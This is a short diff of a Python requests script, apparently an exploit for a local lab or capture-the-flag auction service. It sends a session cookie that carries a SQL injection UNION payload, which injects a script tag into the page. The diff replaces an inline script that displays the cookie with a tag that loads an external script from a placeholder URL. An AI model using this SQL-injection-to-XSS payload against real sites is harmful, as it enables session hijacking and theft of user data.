@@ -1,7 +1,8 @@
 import requests
 
 URL = "http://127.0.0.1:8000/"
-COOKIE = "session_id=\"' UNION ALL SELECT 'Hacker<script>document.body.innerHTML=document.cookie</script>', '', '9999999' --\""
+SCRIPT_URL = ""
+COOKIE = "session_id=\"' UNION ALL SELECT 'Hacker<script src={}></script>', '', '9999999' --\"".format(SCRIPT_URL)
 
 # получаем список лотов
 r = requests.get(URL + "all_lots", headers={"Cookie": COOKIE})
